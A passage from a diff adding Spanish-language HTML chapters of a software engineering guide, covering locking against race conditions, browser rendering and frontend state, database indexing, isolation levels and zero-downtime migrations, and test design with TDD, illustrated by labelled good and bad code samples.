+            expected_version=item.version  <span class="cm"># Falla si otro lo modificó</span>
+        )
+        <span class="kw">if</span> updated:
+            <span class="kw">return</span>  <span class="cm"># Éxito</span>
+    <span class="kw">raise</span> ConcurrentModificationError()
+
+<span class="cm"># ✓ Solución 2: Pessimistic locking — SELECT FOR UPDATE</span>
+<span class="kw">async def</span> <span class="fn">reserve_item_pessimistic</span>(item_id: str, quantity: int):
+    <span class="kw">async with</span> db.<span class="fn">transaction</span>():
+        <span class="cm"># Bloquea la fila — otros requests esperan hasta que esta TX termine</span>
+        item = <span class="kw">await</span> db.<span class="fn">get_item_for_update</span>(item_id)  <span class="cm"># SELECT FOR UPDATE</span>
+        <span class="kw">if</span> item.stock &lt; quantity:
+            <span class="kw">raise</span> InsufficientStockError()
+        <span class="kw">await</span> db.<span class="fn">update_stock</span>(item_id, item.stock - quantity)
+        <span class="cm"># Lock liberado al terminar la transacción</span>
+
+<span class="cm"># ✓ Solución 3: Atomic operation — sin locks, más escalable</span>
+<span class="cm"># UPDATE items SET stock = stock - :qty
+#   WHERE id = :id AND stock >= :qty
+# Retorna rows_affected: si es 0, no había stock suficiente</span></code></pre>
+
+                    <div class="arch-rel">
+                        <span class="arch-rel-lbl">Conexión técnica</span>
+                        <p>El backend engineering implementa los patrones de la arquitectura de sistemas: las race
+                            conditions se
+                            resuelven con los mismos principios de ACID que definen las bases de datos relacionales, la
+                            autenticación
+                            con JWT conecta con <strong>Zero Trust</strong> y la gestión de identidad, y el diseño de
+                            APIs bien
+                            versionadas es la base del <strong>Strangler Fig Pattern</strong> para migraciones
+                            incrementales.</p>
+                    </div>
+                </section>
+
+
+                <!-- ════════════════════════════════════════
+     CAP 05: FRONTEND ENGINEERING
+     ════════════════════════════════════════ -->
+                <section class="chapter" id="cap05">
+                    <div class="ch-header">
+                        <span class="ch-badge">CAP. 05</span>
+                        <h2>Frontend Engineering</h2>
+                    </div>
+
+                    <p>El frontend es el único lugar del stack donde el código se ejecuta en un entorno que no
+                        controlas: el
+                        navegador del usuario. Con CPU variable, conexión variable, sistema operativo variable, y el
+                        usuario
+                        haciendo cosas que nunca anticipaste. Diseñar para esta incertidumbre es el arte central del
+                        frontend
+                        engineering.</p>
+
+                    <h3 id="browser">El Navegador como Plataforma Real</h3>
+
+                    <div class="diagram">
+                        <pre><code>
+  Cómo el Navegador Renderiza una Página: El Critical Rendering Path
+
+  HTML recibido
+      │
+      ▼
+  ┌──────────────────────────────────────────────────────────────────┐
+  │  PARSING HTML → DOM Tree                                        │
+  │  Bloqueado por: &lt;script&gt; sin async/defer (parser blocking)      │
+  ├──────────────────────────────────────────────────────────────────┤
+  │  PARSING CSS → CSSOM Tree                                       │
+  │  Bloqueado por: stylesheets no cargados                         │
+  ├──────────────────────────────────────────────────────────────────┤
+  │  DOM + CSSOM → Render Tree (solo nodos visibles)                │
+  ├──────────────────────────────────────────────────────────────────┤
+  │  LAYOUT (Reflow): calcular posición y tamaño de cada elemento   │
+  │  Costoso: triggereado por cambios de dimensiones                │
+  ├──────────────────────────────────────────────────────────────────┤
+  │  PAINT: rellenar píxeles en capas                               │
+  ├──────────────────────────────────────────────────────────────────┤
+  │  COMPOSITE: combinar capas en la imagen final (GPU)             │
+  └──────────────────────────────────────────────────────────────────┘
+
+  Propiedades que solo triggean Composite (más baratas):
+  transform, opacity → animarlas es smooth (60fps)
+
+  Propiedades que triggean Layout (caras):
+  width, height, top, left, margin → causan reflow completo
+
+  Propiedades que triggean Paint (medias):
+  color, background, box-shadow → repinta sin recalcular layout
+</code></pre>
+                    </div>
+
+                    <pre data-lang="javascript"><code><span class="cm">// Layout thrashing: el error de performance más común en JS</span>
+
+<span class="cm">// ❌ Fuerza reflow en cada iteración — O(n) reflows</span>
+<span class="kw">const</span> elements = document.<span class="fn">querySelectorAll</span>(<span class="str">'.item'</span>)
+elements.<span class="fn">forEach</span>(el => {
+  <span class="kw">const</span> height = el.offsetHeight   <span class="cm">// Lee → fuerza reflow</span>
+  el.style.height = (height * <span class="nm">2</span>) + <span class="str">'px'</span>  <span class="cm">// Escribe → invalida layout</span>
+  <span class="cm">// En el siguiente .offsetHeight, el browser DEBE recalcular</span>
+  <span class="cm">// antes de devolver el valor → thrashing</span>
+})
+
+<span class="cm">// ✓ Batch reads, then batch writes — un solo reflow</span>
+<span class="kw">const</span> elements = document.<span class="fn">querySelectorAll</span>(<span class="str">'.item'</span>)
+<span class="cm">// Fase 1: leer todos los valores (un solo reflow)</span>
+<span class="kw">const</span> heights = [...elements].<span class="fn">map</span>(el => el.offsetHeight)
+<span class="cm">// Fase 2: escribir todos los valores (un solo repaint)</span>
+elements.<span class="fn">forEach</span>((el, i) => {
+  el.style.height = (heights[i] * <span class="nm">2</span>) + <span class="str">'px'</span>
+})
+
+<span class="cm">// ✓ Para animaciones: requestAnimationFrame + CSS transforms</span>
+<span class="kw">function</span> <span class="fn">animateElement</span>(el: HTMLElement, distance: number) {
+  <span class="kw">let</span> start: number
+  <span class="kw">function</span> <span class="fn">step</span>(timestamp: number) {
+    <span class="kw">if</span> (!start) start = timestamp
+    <span class="kw">const</span> progress = Math.<span class="fn">min</span>((timestamp - start) / <span class="nm">300</span>, <span class="nm">1</span>)
+    <span class="cm">// transform: solo Composite — no reflow ni repaint</span>
+    el.style.transform = <span class="str">`translateX(${progress * distance}px)`</span>
+    <span class="kw">if</span> (progress &lt; <span class="nm">1</span>) requestAnimationFrame(step)
+  }
+  requestAnimationFrame(step)
+}</code></pre>
+
+                    <h3 id="state">Estado: El Problema Central del Frontend</h3>
+                    <p>La mayoría de los bugs de frontend son bugs de estado: la UI muestra algo que no refleja la
+                        realidad, o dos
+                        partes de la UI muestran estados inconsistentes. Gestionar el estado con disciplina es la
+                        habilidad más
+                        importante del frontend engineer.</p>
+
+                    <div class="diagram">
+                        <pre><code>
+  Tipos de Estado y Dónde Vivirlos
+
+  ┌────────────────────────────────────────────────────────────────┐
+  │  Estado LOCAL (useState, signals)                              │
+  │  • Estado UI: ¿está abierto el dropdown? ¿qué tab es activa?  │
+  │  • Solo importa a un componente o árbol pequeño               │
+  │  • No compartir en global si no es necesario                   │
+  ├────────────────────────────────────────────────────────────────┤
+  │  Estado de SERVIDOR (React Query, SWR, TanStack Query)         │
+  │  • Datos que viven en el backend                               │
+  │  • Tienen cache, loading, error states automáticos             │
+  │  • NO duplicar en Redux/Zustand — eso es el error más común   │
+  │  • Invalidación automática tras mutaciones                     │
+  ├────────────────────────────────────────────────────────────────┤
+  │  Estado GLOBAL de UI (Zustand, Jotai, Redux Toolkit)           │
+  │  • Tema, idioma, usuario autenticado, notificaciones           │
+  │  • Solo lo que realmente necesita ser global                   │
+  │  • Redux para: estado complejo con muchas transiciones         │
+  │  • Zustand para: estado simple compartido entre componentes    │
+  ├────────────────────────────────────────────────────────────────┤
+  │  Estado en URL (query params, route params)                    │
+  │  • Filtros, búsquedas, paginación, estado de modales           │
+  │  • Permite compartir y bookmarkear el estado de la app         │
+  │  • Subestimado — debería usarse mucho más                      │
+  └────────────────────────────────────────────────────────────────┘
+
+  Error más común: poner TODO en Redux/estado global
+  cuando el 80% debería ser estado de servidor o local.
+</code></pre>
+                    </div>
+
+                    <pre data-lang="typescript"><code><span class="cm">// TanStack Query: estado de servidor correcto</span>
+<span class="cm">// En lugar de: useEffect + useState + loading + error + refetch manual</span>
+
+<span class="cm">// ❌ El patrón que todos escriben y que tiene 10 bugs sutiles</span>
+<span class="kw">function</span> <span class="fn">UserProfile</span>({ userId }: { userId: string }) {
+  <span class="kw">const</span> [user, setUser] = useState&lt;User | null&gt;(null)
+  <span class="kw">const</span> [loading, setLoading] = useState(true)
+  <span class="kw">const</span> [error, setError] = useState&lt;Error | null&gt;(null)
+
+  useEffect(() => {
+    setLoading(true)
+    fetchUser(userId)
+      .then(setUser)
+      .catch(setError)
+      .finally(() => setLoading(false))
+  }, [userId])
+  <span class="cm">// Bugs: stale closure, race condition si userId cambia,
+  // no hay cache, no hay refetch, no hay retry automático</span>
+}
+
+<span class="cm">// ✓ TanStack Query: cache, loading, error, retry, refetch — todo incluido</span>
+<span class="kw">function</span> <span class="fn">UserProfile</span>({ userId }: { userId: string }) {
+  <span class="kw">const</span> { data: user, isLoading, error } = useQuery({
+    queryKey: [<span class="str">'user'</span>, userId],          <span class="cm">// Cache key</span>
+    queryFn: () => fetchUser(userId),
+    staleTime: <span class="nm">5</span> * <span class="nm">60</span> * <span class="nm">1000</span>,            <span class="cm">// 5 min frescos</span>
+    retry: <span class="nm">3</span>,                              <span class="cm">// 3 reintentos automáticos</span>
+  })
+
+  <span class="kw">if</span> (isLoading) <span class="kw">return</span> &lt;UserSkeleton /&gt;
+  <span class="kw">if</span> (error)     <span class="kw">return</span> &lt;ErrorBoundary error={error} /&gt;
+  <span class="kw">return</span> &lt;UserCard user={user} /&gt;
+}
+
+<span class="cm">// Mutación con invalidación automática del cache</span>
+<span class="kw">function</span> <span class="fn">UpdateUserForm</span>({ userId }: { userId: string }) {
+  <span class="kw">const</span> queryClient = useQueryClient()
+  <span class="kw">const</span> mutation = useMutation({
+    mutationFn: (data: UpdateUserDTO) => updateUser(userId, data),
+    onSuccess: () => {
+      <span class="cm">// Invalida el cache → refetch automático del perfil</span>
+      queryClient.invalidateQueries({ queryKey: [<span class="str">'user'</span>, userId] })
+    }
+  })
+}</code></pre>
+
+                    <h3 id="perf-fe">Performance Frontend: Lo que Realmente Importa</h3>
+
+                    <div class="table-wrap">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Métrica</th>
+                                    <th>Qué mide</th>
+                                    <th>Objetivo</th>
+                                    <th>Cómo mejorarla</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td><strong>FCP</strong> — First Contentful Paint</td>
+                                    <td>Cuándo el usuario ve algo</td>
+                                    <td class="g">&lt; 1.8s</td>
+                                    <td>Server-side rendering, critical CSS inline, preload fonts</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>LCP</strong> — Largest Contentful Paint</td>
+                                    <td>Cuándo carga el elemento principal</td>
+                                    <td class="g">&lt; 2.5s</td>
+                                    <td>Optimizar imágenes, CDN, preload LCP image</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>CLS</strong> — Cumulative Layout Shift</td>
+                                    <td>Cuánto se mueve el contenido</td>
+                                    <td class="g">&lt; 0.1</td>
+                                    <td>Dimensiones en imágenes/videos, skeleton screens</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>INP</strong> — Interaction to Next Paint</td>
+                                    <td>Responsividad a interacciones</td>
+                                    <td class="g">&lt; 200ms</td>
+                                    <td>Debounce, web workers, code splitting, avoid long tasks</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>TTFB</strong> — Time to First Byte</td>
+                                    <td>Tiempo de respuesta del servidor</td>
+                                    <td class="g">&lt; 800ms</td>
+                                    <td>CDN, SSR/SSG, edge functions, caching</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+
+                    <pre data-lang="typescript"><code><span class="cm">// Code splitting: cargar solo lo necesario cuando se necesita</span>
+
+<span class="cm">// ❌ Un bundle gigante — todo el código al cargar la app</span>
+<span class="kw">import</span> { AdminDashboard } <span class="kw">from</span> <span class="str">'./AdminDashboard'</span>  <span class="cm">// 200KB innecesarios para usuarios normales</span>
+<span class="kw">import</span> { ReportGenerator } <span class="kw">from</span> <span class="str">'./ReportGenerator'</span>  <span class="cm">// Solo lo usan 5% de usuarios</span>
+
+<span class="cm">// ✓ Lazy loading — cargar solo cuando el usuario necesita ese código</span>
+<span class="kw">const</span> AdminDashboard = lazy(() => <span class="kw">import</span>(<span class="str">'./AdminDashboard'</span>))
+<span class="kw">const</span> ReportGenerator = lazy(() => <span class="kw">import</span>(<span class="str">'./ReportGenerator'</span>))
+
+<span class="kw">function</span> <span class="fn">App</span>() {
+  <span class="kw">return</span> (
+    &lt;Suspense fallback={&lt;PageSkeleton /&gt;}&gt;
+      &lt;Routes&gt;
+        &lt;Route path=<span class="str">"/admin"</span> element={&lt;AdminDashboard /&gt;} /&gt;
+        &lt;Route path=<span class="str">"/reports"</span> element={&lt;ReportGenerator /&gt;} /&gt;
+      &lt;/Routes&gt;
+    &lt;/Suspense&gt;
+  )
+}
+<span class="cm">// Resultado: bundle inicial 40% más pequeño → FCP significativamente mejor</span>
+
+<span class="cm">// ─────────────────────────────────────────────────────────
+// Virtualización: renderizar solo lo visible</span>
+<span class="kw">import</span> { useVirtualizer } <span class="kw">from</span> <span class="str">'@tanstack/react-virtual'</span>
+
+<span class="kw">function</span> <span class="fn">LargeList</span>({ items }: { items: Item[] }) {
+  <span class="kw">const</span> virtualizer = useVirtualizer({
+    count: items.length,    <span class="cm">// 50,000 items</span>
+    getScrollElement: () => parentRef.current,
+    estimateSize: () => <span class="nm">50</span>,  <span class="cm">// altura estimada por item</span>
+  })
+  <span class="cm">// Renderiza ~20 items (los visibles) aunque haya 50,000
+  // Sin virtualización: 50,000 DOM nodes → app completamente inutilizable</span>
+}</code></pre>
+
+                    <div class="arch-rel">
+                        <span class="arch-rel-lbl">Conexión técnica</span>
+                        <p>El frontend engineering conecta con <strong>Backend Engineering</strong> a través del diseño
+                            de API: una
+                            API que devuelve exactamente los campos que el frontend necesita (no más, no menos) es la
+                            diferencia entre
+                            un FCP de 1s y de 4s. Los patrones de estado de servidor (TanStack Query) implementan los
+                            mismos
+                            principios de <strong>caching y eventual consistency</strong> que los sistemas distribuidos
+                            del backend.
+                        </p>
+                    </div>
+                </section>
+
+                <!-- ════════════════════════════════════════
+     CAP 06: BASES DE DATOS
+     ════════════════════════════════════════ -->
+                <section class="chapter" id="cap06">
+                    <div class="ch-header">
+                        <span class="ch-badge">CAP. 06</span>
+                        <h2>Bases de Datos</h2>
+                    </div>
+
+                    <p>Las bases de datos son el componente más crítico y más mal entendido del stack. Un modelo de
+                        datos
+                        incorrecto, un índice que falta, o una transacción mal diseñada pueden hacer que un sistema que
+                        funciona
+                        perfectamente con 1,000 usuarios colapse con 100,000. El conocimiento de bases de datos es lo
+                        que más
+                        distingue a un senior de un mid engineer.</p>
+
+                    <h3 id="indexing">Indexing Real: Más Allá de "Añadir un Índice"</h3>
+
+                    <div class="diagram">
+                        <pre><code>
+  Cómo funciona un B-Tree Index (el más común)
+
+  Tabla: users (10M filas)
+  Columna: email (sin índice)
+
+  SELECT * FROM users WHERE email = 'john@example.com'
+  → Full table scan: leer las 10M filas = ~5-10 segundos
+
+  Con índice B-Tree en email:
+  → O(log n) lookups: ~3-4 niveles de árbol = microsegundos
+
+  Estructura B-Tree:
+                    [M-S]
+                   /     \
+            [E-J]           [T-Z]
+           /     \           /    \
+       [A-D]   [F-I]    [J-P]   [U-Z]
+         │       │         │       │
+      leaf     leaf      leaf    leaf
+    pages     pages     pages   pages
+      │         │         │       │
+    ROWIDs    ROWIDs    ROWIDs  ROWIDs
+  (punteros a las filas reales en el heap)
+
+  B-Tree es eficiente para: =, >, <, >=, <=, BETWEEN, LIKE 'prefix%'
+  B-Tree NO ayuda para: LIKE '%suffix', funciones sobre la columna
+</code></pre>
+                    </div>
+
+                    <pre data-lang="sql"><code><span class="cm">-- Índices que realmente marcan la diferencia</span>
+
+<span class="cm">-- 1. Índice compuesto: el orden importa enormemente</span>
+<span class="cm">-- Query: WHERE user_id = 123 AND status = 'active' ORDER BY created_at DESC</span>
+<span class="cm">-- Índice correcto: (user_id, status, created_at)</span>
+<span class="cm">-- Regla: columnas de equality primero, range/sort al final</span>
+<span class="kw">CREATE INDEX</span> idx_orders_user_status_date
+    <span class="kw">ON</span> orders (user_id, status, created_at <span class="kw">DESC</span>);
+
+<span class="cm">-- 2. Índice parcial: indexar solo las filas relevantes</span>
+<span class="cm">-- Si el 95% de las órdenes están 'completed', solo indexar 'pending'</span>
+<span class="kw">CREATE INDEX</span> idx_orders_pending
+    <span class="kw">ON</span> orders (created_at)
+    <span class="kw">WHERE</span> status = <span class="str">'pending'</span>;
+<span class="cm">-- 20x más pequeño y más rápido que indexar toda la tabla</span>
+
+<span class="cm">-- 3. Covering index: el índice contiene todo lo que la query necesita</span>
+<span class="cm">-- La query NO necesita ir al heap (Index Only Scan)</span>
+<span class="kw">CREATE INDEX</span> idx_users_email_covering
+    <span class="kw">ON</span> users (email) <span class="kw">INCLUDE</span> (id, name, plan);
+<span class="cm">-- SELECT id, name, plan FROM users WHERE email = ?
+-- → Resuelto completamente desde el índice, sin tocar la tabla</span>
+
+<span class="cm">-- 4. EXPLAIN ANALYZE: siempre antes de añadir/eliminar un índice</span>
+<span class="kw">EXPLAIN</span> (ANALYZE, BUFFERS, FORMAT TEXT)
+<span class="kw">SELECT</span> o.id, o.total, u.email
+<span class="kw">FROM</span> orders o
+<span class="kw">JOIN</span> users u <span class="kw">ON</span> u.id = o.user_id
+<span class="kw">WHERE</span> o.status = <span class="str">'pending'</span>
+  <span class="kw">AND</span> o.created_at > NOW() - <span class="str">'24 hours'</span>::interval;
+
+<span class="cm">-- Buscar en el output:
+-- "Seq Scan" en tabla grande → candidato a índice
+-- "Rows Removed by Filter" alto → el índice no es selectivo
+-- "Buffers: shared hit=X read=Y" → X en caché, Y leyó disco (malo si Y alto)
+-- "actual time" vs "estimated rows" → si muy diferente, falta ANALYZE</span></code></pre>
+
+                    <h3 id="transactions">Transacciones: Isolation Levels que Importan</h3>
+                    <p>Las transacciones no son solo "ACID o no ACID". Los isolation levels permiten elegir el nivel de
+                        protección
+                        según el caso de uso — con el trade-off entre consistencia y concurrencia.</p>
+
+                    <div class="table-wrap">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Isolation Level</th>
+                                    <th>Dirty Read</th>
+                                    <th>Non-Repeatable Read</th>
+                                    <th>Phantom Read</th>
+                                    <th>Cuándo usar</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td><strong>READ UNCOMMITTED</strong></td>
+                                    <td class="r">Posible</td>
+                                    <td class="r">Posible</td>
+                                    <td class="r">Posible</td>
+                                    <td>Casi nunca — solo dashboards de analytics aproximados</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>READ COMMITTED</strong></td>
+                                    <td class="g">No</td>
+                                    <td class="r">Posible</td>
+                                    <td class="r">Posible</td>
+                                    <td>Default en PostgreSQL — adecuado para la mayoría de operaciones</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>REPEATABLE READ</strong></td>
+                                    <td class="g">No</td>
+                                    <td class="g">No</td>
+                                    <td class="r">Posible</td>
+                                    <td>Reportes financieros que necesitan snapshot consistente</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>SERIALIZABLE</strong></td>
+                                    <td class="g">No</td>
+                                    <td class="g">No</td>
+                                    <td class="g">No</td>
+                                    <td>Transferencias bancarias, inventario con stock crítico</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+
+                    <pre data-lang="sql"><code><span class="cm">-- Caso real: transferencia bancaria que requiere SERIALIZABLE</span>
+<span class="kw">BEGIN</span> TRANSACTION ISOLATION LEVEL SERIALIZABLE;
+
+<span class="cm">-- Leer saldo actual</span>
+<span class="kw">SELECT</span> balance <span class="kw">FROM</span> accounts <span class="kw">WHERE</span> id = :from_account;
+<span class="cm">-- En READ COMMITTED: otro TX podría cambiar el saldo AQUÍ</span>
+<span class="cm">-- y este TX no lo sabría hasta el COMMIT</span>
+<span class="cm">-- En SERIALIZABLE: se detecta el conflicto y se hace rollback</span>
+
+<span class="kw">UPDATE</span> accounts <span class="kw">SET</span> balance = balance - :amount <span class="kw">WHERE</span> id = :from_account;
+<span class="kw">UPDATE</span> accounts <span class="kw">SET</span> balance = balance + :amount <span class="kw">WHERE</span> id = :to_account;
+
+<span class="kw">COMMIT</span>; <span class="cm">-- Si hay conflicto serializable → ERROR, el cliente reintenta</span>
+
+<span class="cm">-- ─────────────────────────────────────────────────────────
+-- Deadlocks: cómo evitarlos sistemáticamente</span>
+<span class="cm">-- TX1: UPDATE accounts WHERE id = 1, luego WHERE id = 2
+-- TX2: UPDATE accounts WHERE id = 2, luego WHERE id = 1
+-- → Deadlock garantizado si ocurren concurrentemente
+
+-- Solución: SIEMPRE acceder a recursos en el mismo orden</span>
+<span class="cm">-- Ordenar los IDs antes de la transacción:</span>
+<span class="cm">-- ids = sorted([from_id, to_id])  → siempre en el mismo orden</span>
+<span class="cm">-- UPDATE accounts WHERE id = ids[0] ... WHERE id = ids[1]</span>
+<span class="cm">-- → Deadlock matemáticamente imposible</span></code></pre>
+
+                    <h3 id="migrations">Migraciones sin Downtime: La Habilidad que Más Importa en Producción</h3>
+
+                    <div class="diagram">
+                        <pre><code>
+  Expand-Contract Pattern: El único patrón seguro
+
+  OBJETIVO: Renombrar columna 'user_name' a 'full_name' en 50M filas
+
+  ❌ Forma naive (causa downtime):
+  ALTER TABLE users RENAME COLUMN user_name TO full_name;
+  → Bloquea la tabla durante la migración
+  → En 50M filas: puede tomar minutos → downtime total
+
+  ✓ Expand-Contract (zero downtime):
+
+  FASE 1 — EXPAND (añadir nueva columna):
+  ALTER TABLE users ADD COLUMN full_name VARCHAR(255);
+  → No bloquea. La columna empieza NULL.
+  → Deploy del código que escribe en AMBAS columnas
+     (user_name Y full_name simultáneamente)
+
+  FASE 2 — BACKFILL (migrar datos existentes):
+  UPDATE users SET full_name = user_name
+    WHERE full_name IS NULL
+    LIMIT 1000;  ← en batches, no todo de una vez
+  → Ejecutar en background, sin bloquear la tabla
+
+  FASE 3 — SWITCH (el código lee de full_name):
+  → Deploy del código que solo lee full_name
+  → Verificar que nada usa user_name ya
+
+  FASE 4 — CONTRACT (eliminar la columna vieja):
+  ALTER TABLE users DROP COLUMN user_name;
+  → Ahora sí es seguro — nadie la usa
+
+  Total de downtime: CERO
+  Tiempo total: días o semanas, pero sin impacto en usuarios
+</code></pre>
+                    </div>
+
+                    <pre
+                        data-lang="python"><code><span class="cm"># Backfill en batches — nunca migrar millones de filas de una vez</span>
+<span class="kw">async def</span> <span class="fn">backfill_full_name</span>(batch_size: int = <span class="nm">1000</span>):
+    <span class="str">"""
+    Migra datos en batches pequeños para:
+    - No bloquear la tabla
+    - Poder pausar y reanudar
+    - No llenar el WAL de PostgreSQL
+    - No causar spike de carga en la BD
+    """</span>
+    last_id = <span class="nm">0</span>
+    total_migrated = <span class="nm">0</span>
+
+    <span class="kw">while</span> True:
+        <span class="cm"># Batch: solo filas pendientes (full_name NULL) y en orden</span>
+        rows = <span class="kw">await</span> db.<span class="fn">fetch</span>(
+            <span class="str">"""UPDATE users
+               SET full_name = user_name
+               WHERE id IN (
+                 SELECT id FROM users
+                 WHERE full_name IS NULL AND id > $1
+                 ORDER BY id LIMIT $2
+               )
+               RETURNING id"""</span>,
+            last_id, batch_size
+        )
+        <span class="kw">if not</span> rows:
+            <span class="kw">break</span>  <span class="cm"># Backfill completo</span>
+
+        last_id = max(row[<span class="str">'id'</span>] <span class="kw">for</span> row <span class="kw">in</span> rows)
+        total_migrated += len(rows)
+
+        <span class="cm"># Pausa entre batches: dar respiro a la BD</span>
+        <span class="kw">await</span> asyncio.sleep(<span class="nm">0.05</span>)
+
+        logger.<span class="fn">info</span>(f<span class="str">"Migrated {total_migrated} rows, last_id={last_id}"</span>)
+
+    logger.<span class="fn">info</span>(f<span class="str">"Backfill complete: {total_migrated} total rows"</span>)</code></pre>
+
+                    <div class="arch-rel">
+                        <span class="arch-rel-lbl">Conexión técnica</span>
+                        <p>El conocimiento de bases de datos es transversal a toda la arquitectura. Los isolation levels
+                            implementan
+                            los principios de <strong>ACID</strong> que distinguen bases relacionales de NoSQL. El
+                            Expand-Contract
+                            pattern es la materialización técnica del principio <strong>Open/Closed</strong> aplicado al
+                            schema. Los
+                            índices compuestos implementan la lógica de acceso que define el diseño de las
+                            <strong>queries
+                                CQRS</strong>.
+                        </p>
+                    </div>
+                </section>
+
+                <!-- ════════════════════════════════════════
+     CAP 07: TESTING
+     ════════════════════════════════════════ -->
+                <section class="chapter" id="cap07">
+                    <div class="ch-header">
+                        <span class="ch-badge">CAP. 07</span>
+                        <h2>Testing: Confianza, No Coverage</h2>
+                    </div>
+
+                    <p>El objetivo del testing no es tener un número alto de coverage. Es tener la <strong>confianza de
+                            que el
+                            código hace lo que se supone que debe hacer</strong>, y la certeza de que si alguien lo
+                        cambia y algo se
+                        rompe, los tests lo detectarán. Un 95% de coverage con tests que nunca fallan aunque introduzcas
+                        bugs es
+                        peor que un 60% con tests que detectan regresiones reales.</p>
+
+                    <div class="callout axiom">
+                        <div class="callout-icon"></div>
+                        <p><strong>Axioma de testing:</strong> Un test que nunca puede fallar es inútil. Un test que
+                            solo puede
+                            fallar cuando el código tiene un bug real — eso tiene valor. Antes de escribir un test,
+                            pregúntate: "¿De
+                            qué bug me protege este test?"</p>
+                    </div>
+
+                    <h3 id="test-confidence">Tests que Dan Confianza Real</h3>
+
+                    <pre data-lang="typescript"><code><span class="cm">// ❌ Test que pasa siempre — zero valor, false confidence</span>
+describe(<span class="str">'calculateTotal'</span>, () => {
+  it(<span class="str">'should return a number'</span>, () => {
+    <span class="kw">const</span> result = calculateTotal([{ price: <span class="nm">10</span>, qty: <span class="nm">2</span> }])
+    expect(<span class="kw">typeof</span> result).toBe(<span class="str">'number'</span>)  <span class="cm">// ¿Qué bug detecta esto?</span>
+  })
+})
+
+<span class="cm">// ❌ Test que verifica implementación, no comportamiento</span>
+it(<span class="str">'should call repository.save once'</span>, () => {
+  <span class="kw">const</span> mockRepo = { save: jest.fn() }
+  createUser(mockRepo, userData)
+  expect(mockRepo.save).toHaveBeenCalledTimes(<span class="nm">1</span>)  <span class="cm">// Testa el cómo, no el qué</span>
+  <span class="cm">// Si refactorizas para llamar save() dos veces con los mismos datos,
+  // el test falla aunque el comportamiento sea correcto</span>
+})
+
+<span class="cm">// ✓ Test que verifica comportamiento observable</span>
+describe(<span class="str">'OrderService'</span>, () => {
+  describe(<span class="str">'createOrder'</span>, () => {
+    it(<span class="str">'calculates correct total including tax'</span>, async () => {
+      <span class="kw">const</span> order = <span class="kw">await</span> orderService.create({
+        items: [
+          { productId: <span class="str">'p1'</span>, quantity: <span class="nm">2</span>, unitPrice: <span class="nm">100</span> },
+          { productId: <span class="str">'p2'</span>, quantity: <span class="nm">1</span>, unitPrice: <span class="nm">50</span>  },
+        ],
+        taxRate: <span class="nm">0.21</span>
+      })
+
+      expect(order.subtotal).toBe(<span class="nm">250</span>)
+      expect(order.tax).toBe(<span class="nm">52.50</span>)
+      expect(order.total).toBe(<span class="nm">302.50</span>)
+    })
+
+    it(<span class="str">'rejects order with out-of-stock items'</span>, async () => {
+      stockService.setStock(<span class="str">'p1'</span>, <span class="nm">0</span>)  <span class="cm">// Setup: sin stock</span>
+
+      <span class="kw">await</span> expect(
+        orderService.create({ items: [{ productId: <span class="str">'p1'</span>, quantity: <span class="nm">1</span> }] })
+      ).rejects.toThrow(InsufficientStockError)
+    })
+
+    it(<span class="str">'emits OrderCreated event after successful creation'</span>, async () => {
+      <span class="kw">const</span> events: OrderEvent[] = []
+      eventBus.on(<span class="str">'OrderCreated'</span>, (e) => events.push(e))
+
+      <span class="kw">await</span> orderService.create(validOrderData)
+
+      expect(events).toHaveLength(<span class="nm">1</span>)
+      expect(events[<span class="nm">0</span>].orderId).toBeDefined()
+    })
+  })
+})</code></pre>
+
+                    <h3 id="tdd">TDD como Herramienta de Diseño</h3>
+                    <p>TDD (Test-Driven Development) no es escribir tests antes del código por disciplina. Es usar los
+                        tests para
+                        diseñar la interfaz pública de tu código antes de implementarla. Cuando escribes el test
+                        primero, estás
+                        forzado a pensar desde el punto de vista del consumidor del código — lo que produce APIs más
+                        limpias y más
+                        usables.</p>
+
+                    <div class="diagram">
+                        <pre><code>
+  Red-Green-Refactor: El ciclo de TDD
+
+  RED   → Escribir el test que describe el comportamiento deseado
+          El test FALLA porque el código no existe aún
+          Esto confirma que el test puede detectar el bug
+
+  GREEN → Escribir el código MÁS SIMPLE posible que hace pasar el test
+          No importa si es "feo" — el objetivo es pasar el test
+          "Fake it till you make it" está permitido aquí
+
+  REFACTOR → Con el test verde como red de seguridad,
+             mejorar el código sin cambiar el comportamiento
+             Si el test sigue verde, el refactor fue correcto
+
+  Repetir para cada comportamiento nuevo.
+
+  El beneficio real no es tener tests — es que el diseño
+  emergente de escribir tests primero produce código
+  más modular, más testeable, y más bajo acoplamiento.
+
+  Señal de que el diseño es incorrecto: si es difícil
+  escribir el test, la función tiene demasiadas dependencias.
+  El dolor de testing es información de diseño.
+</code></pre>
+                    </div>
+
+                    <pre data-lang="python"><code><span class="cm"># TDD real: diseñando un validador de contraseñas</span>
+
+<span class="cm"># PASO 1: RED — escribir el test que describe el comportamiento</span>
+<span class="kw">def</span> <span class="fn">test_password_must_be_at_least_8_characters</span>():
+    result = validate_password(<span class="str">"short"</span>)
+    assert result.is_valid == <span class="kw">False</span>
+    assert <span class="str">"at least 8 characters"</span> <span class="kw">in</span> result.errors
+
+<span class="kw">def</span> <span class="fn">test_password_must_contain_uppercase</span>():
+    result = validate_password(<span class="str">"alllowercase1!"</span>)
+    assert result.is_valid == <span class="kw">False</span>
+    assert <span class="str">"uppercase letter"</span> <span class="kw">in</span> result.errors
+
+<span class="kw">def</span> <span class="fn">test_valid_password_passes_all_rules</span>():
+    result = validate_password(<span class="str">"ValidPass1!"</span>)
+    assert result.is_valid == <span class="kw">True</span>
+    assert len(result.errors) == <span class="nm">0</span>
+
+<span class="cm"># PASO 2: GREEN — implementación mínima que pasa los tests</span>
+<span class="kw">from</span> dataclasses <span class="kw">import</span> dataclass, field
+
+<span class="k2">@dataclass</span>
+<span class="kw">class</span> <span class="fn">ValidationResult</span>:
+    is_valid: bool
